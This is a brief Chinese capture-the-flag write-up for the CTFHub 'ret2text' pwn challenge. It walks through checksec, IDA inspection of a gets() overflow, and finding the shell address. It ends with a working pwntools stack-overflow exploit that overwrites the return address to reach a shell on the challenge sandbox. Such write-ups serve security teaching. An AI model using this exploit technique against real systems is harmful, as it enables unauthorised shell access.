# CTFHUB-PWN-ret2text

简单栈溢出

下载文件 checksec看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/1bf16d7e61a188e4fb35b6eb3f393e6b.png" alt="" style="max-height:292px; box-sizing:content-box;" />


64位

放入ida64 查看字符串



<img src="https://i-blog.csdnimg.cn/blog_migrate/77aedf6204bba40d30bcc0298c1efa09.png" alt="" style="max-height:401px; box-sizing:content-box;" />


得到shell

然后看看主函数怎么输入



<img src="https://i-blog.csdnimg.cn/blog_migrate/3c5bd4d0b37a745fc92a2edbc4259b9b.png" alt="" style="max-height:189px; box-sizing:content-box;" />


get的危险函数

记住 v4为70h

然后看看shell的地址是多少

<img src="https://i-blog.csdnimg.cn/blog_migrate/47801167883317f7cc6808d81f5ed476.png" alt="" style="max-height:140px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/9e7c7c73d962ffa7acae52a74f04bee4.png" alt="" style="max-height:590px; box-sizing:content-box;" />


4007B8

然后我们可以开始写payload

```cobol
from pwn import *
p=remote('challenge-63285d134b7b0e28.sandbox.ctfhub.com',37331)
payload=b'A'*(0x70+0x08)+p64(0x4007B8)
p.sendline(payload)
p.interactive()
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/c6c1d14cf94c9cc4b9af2937a26745d1.png" alt="" style="max-height:416px; box-sizing:content-box;" />